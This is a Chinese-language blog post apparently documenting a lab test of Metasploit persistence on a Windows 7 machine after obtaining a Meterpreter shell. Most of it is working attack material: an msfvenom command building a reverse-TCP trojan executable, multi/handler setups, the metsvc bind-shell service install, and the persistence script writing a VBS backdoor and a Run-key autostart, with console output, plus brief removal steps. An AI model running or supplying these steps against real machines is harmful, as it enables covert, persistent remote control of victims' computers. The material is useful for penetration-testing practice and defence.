---
layout: post
title: Metasploit 「控制持久化」权限维持
comments: false
description: ""
keywords: "Tricks"
---

在获取到 Meterpreter shell 后进行服务器控制持久化，自带的留后门方式有两种。

## 原理

1、metsvc：通过服务启动，是 Meterpreter 下的一个脚本；

运行 `run metsvc` 将会在目标主机上以 Meterpreter 的服务的形式注册在服务列表中，并开机自动自动；

运行 `run metsvc -r` 卸载目标主机上的 Meterpreter 服务；

原理：设置的后门在目标机启动后会自动开启一个服务，等待连接；这个有点正向代理的意思，自己开个端口等待接入控制；

优点：命令简单，不必设置太多参数，即不需要设置反弹到的主机IP、端口等，直接 `run metsvc -A`；

缺点：如何其他人知道服务器的ip，都可以利用这个后门开启的服务来控制服务器【扫描器发现】；

2、persistence：通过启动项启动，也是 Meterpreter 下的一个脚本；

移除后门：删除注册表中的值和上传的 VBScript 文件，具体位置执行脚本后有提示。

原理：有点反向代理的意思；

优点：由于是主动献殷勤，目标机器上的防火墙对于此等操作一般均会放行，后门的存活率较高；

## 情况？

Mac【Metasploit】：192.168.43.100

Win7【目标机】：192.168.43.103【桥接】，开启3389端口方便检测验证

实际场景：拿到目标机权限后，希望能够进行长期控制，即目标开机后仍可上线，或者说本地开启监听后目标仍可上线；

生成反弹shell木马；

```
[Go0s]: ~ 
➜  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.100 LPORT=4444 -f exe > ~/Desktop/shell.exe 
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 333 bytes
Final size of exe file: 73802 bytes
```

直接在目标机运行上线，拿到目标机的 Meterpreter shell；

```
msf exploit(handler) > use exploit/multi/handler 
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 192.168.43.100
lhost => 192.168.43.100
msf exploit(handler) > exploit 

[*] Started reverse TCP handler on 192.168.43.100:4444 
[*] Sending stage (179267 bytes) to 192.168.43.103
[*] Meterpreter session 1 opened (192.168.43.100:4444 -> 192.168.43.103:49283) at 2018-01-12 14:49:13 +0800
```

## metsvc

利用失败，提示 `deprecated` 不推荐使用；

```
meterpreter > run metsvc -h

[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]

OPTIONS:

    -A        Automatically start a matching exploit/multi/handler to connect to the service
    -h        This help menu
    -r        Uninstall an existing Meterpreter service (files must be deleted manually)

meterpreter > run metsvc

[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
[*] Creating a meterpreter service on port 31337
[*] Creating a temporary installation directory C:\Users\Go0s\AppData\Local\Temp\HLDIkkGKSJ...
[*]  >> Uploading metsrv.x86.dll...
[*]  >> Uploading metsvc-server.exe...
[*]  >> Uploading metsvc.exe...
[*] Starting the service...
	Cannot open service manager (0x00000005)

meterpreter > run metsvc -A

[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
[*] Creating a meterpreter service on port 31337
[*] Creating a temporary installation directory C:\Users\Go0s\AppData\Local\Temp\kcpFjUBMraKZ...
[*]  >> Uploading metsrv.x86.dll...
[*]  >> Uploading metsvc-server.exe...
[*]  >> Uploading metsvc.exe...
[*] Starting the service...
	Cannot open service manager (0x00000005)

[*] Trying to connect to the Meterpreter service at 192.168.43.103:31337...
meterpreter > run metsvc -A

[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
[*] Creating a meterpreter service on port 31337
[*] Creating a temporary installation directory C:\Users\Go0s\AppData\Local\Temp\EStXBGaPCbHz...
[*]  >> Uploading metsrv.x86.dll...
[*]  >> Uploading metsvc-server.exe...
[*]  >> Uploading metsvc.exe...
[*] Starting the service...
	Cannot open service manager (0x00000005)

[*] Trying to connect to the Meterpreter service at 192.168.43.103:31337...
```

如果Success，则直接使用handler，利用windows/metsvc_bind_tcp的payload：

```
msf > use exploit/multi/handler 
msf exploit(handler) > set payload windows/metsvc_bind_tcp 
payload => windows/metsvc_bind_tcp
msf exploit(handler) > set rhost 192.168.43.103
rhost => 192.168.43.103
msf exploit(handler) > set lport 31337
lport => 31337
msf exploit(handler) > exploit 

[*] Started bind handler
```

三个文件上传成功，失败是由于服务没有启动起来，难不成用户权限低？！

![QQ20180112-151049@2x.png](/assets/images/2018-01-12/2120612193.png)

右键木马shell.exe `以管理员权限运行`，重新拿到 Meterpreter 会话，重新执行 `run metsvc -A`；

```
meterpreter > run metsvc -A

[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
[*] Creating a meterpreter service on port 31337
[*] Creating a temporary installation directory C:\Users\Go0s\AppData\Local\Temp\WYPiyqkOsJZS...
[*]  >> Uploading metsrv.x86.dll...
[*]  >> Uploading metsvc-server.exe...
[*]  >> Uploading metsvc.exe...
[*] Starting the service...
	 * Installing service metsvc
 * Starting service
Service metsvc successfully installed.
```

服务成功开启，session -k 杀掉会话，利用handler下的windows/metsvc_bind_tcp，没多久重新上线；

不过官方都不推荐使用了，自然有缺陷；

移除服务；

```
meterpreter > run metsvc -r

[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
[*] Removing the existing Meterpreter service
[*] Creating a temporary installation directory C:\Users\Go0s\AppData\Local\Temp\KRUyRiAody...
[*]  >> Uploading metsvc.exe...
[*] Stopping the service...
	 * Stopping service metsvc
 * Removing service
Service metsvc successfully removed.
```

## persistence

首先查看帮助信息，发现官方也不推荐了，不过仍然很好用；

```
meterpreter > run persistence -h

[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
Meterpreter Script for creating a persistent backdoor on a target host.

OPTIONS:

    -A        Automatically start a matching exploit/multi/handler to connect to the agent
    -L <opt>  Location in target host to write payload to, if none %TEMP% will be used.
    -P <opt>  Payload to use, default is windows/meterpreter/reverse_tcp.
    -S        Automatically start the agent on boot as a service (with SYSTEM privileges)
    -T <opt>  Alternate executable template to use
    -U        Automatically start the agent when the User logs on
    -X        Automatically start the agent when the system boots
    -h        This help menu
    -i <opt>  The interval in seconds between each connection attempt
    -p <opt>  The port on which the system running Metasploit is listening
    -r <opt>  The IP of the system running Metasploit listening for the connect back
```

参数：

-P：设置Payload，默认为windows\/meterpreter\/reverse_tcp。该默认的payload生成的后门为32位程序。因此，当目标机器为64位系统时，留下的后门将无法运行；

-U：设置后门在用户登录后自启动。该方式会在HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run下添加注册表信息。推荐使用该参数；

-X：设置后门在系统启动后自启动。该方式会在HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run下添加注册表信息。由于权限问题，会导致添加失败，后门将无法启动。因此，在非管理员权限或者未进行BypassUAC操作情况下，不推荐使用该参数；

-i：设置反向连接间隔时间，单位为秒。当设置该参数后，目标机器会每隔设置的时间回连一次所设置的ip；

-p：设置反向连接的端口号。即黑阔用来等待连接的端口；

-r：设置反向连接的ip地址。即黑阔用来等待连接的ip；

执行：`run persistence -U -i 10 -p 4444 -r 192.168.43.100`

```
meterpreter > run persistence -U -i 10 -p 4444 -r 192.168.43.100

[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
[*] Running Persistence Script
[*] Resource file for cleanup created at /Users/go0s/.msf4/logs/persistence/GO0S-PC_20180112.2629/GO0S-PC_20180112.2629.rc
[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.43.100 LPORT=4444
[*] Persistent agent script is 99646 bytes long
[+] Persistent Script written to C:\Users\Go0s\AppData\Local\Temp\SAaYfc.vbs
[*] Executing script C:\Users\Go0s\AppData\Local\Temp\SAaYfc.vbs
[+] Agent executed with PID 156
[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\irZnsVkfdRUZIB
[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\irZnsVkfdRUZIB
```

同样使用handler模块链接后门，payload使用windows/meterpreter/reverse_tcp；

```
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.43.100
LHOST => 192.168.43.100
msf exploit(handler) > exploit

[*] Started reverse TCP handler on 192.168.43.100:4444 
[*] Sending stage (179267 bytes) to 192.168.43.103
[*] Meterpreter session 1 opened (192.168.43.100:4444 -> 192.168.43.103:49365) at 2018-01-12 15:27:15 +0800

meterpreter > getuid
Server username: Go0s-PC\Go0s
```

设置时间间隔为10s，很快；

重启目标机，仍然上线，还是很稳的；

其脚本主要做的工作：

①、上传后门到目标机器【meterpreter的upload命令】；

②、再写自启动注册表【reg】；

根据执行脚本时提示的vbs文件和注册表位置，进行删除后门；

```
Executing script C:\Users\Go0s\AppData\Local\Temp\SAaYfc.vbs
Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\irZnsVkfdRUZIB
```

![QQ20180112-153934@2x.png](/assets/images/2018-01-12/998771956.png)

vbs文件直接删去；

![QQ20180112-154355@2x.png](/assets/images/2018-01-12/3178275181.png)

对于注册表，直接打开 `regedit` 注册表编辑器，`Ctrl+f` 全局搜索关键字【我这是irZnsVkfdRUZIB】，也是直接删去即可；

## oth.

Meterpreter 下可以使用的脚本拓展在post/平台/应用点/脚本；

这post模块目录下有许多模块提供使用，又一次感到MSF真鸡儿牛逼；
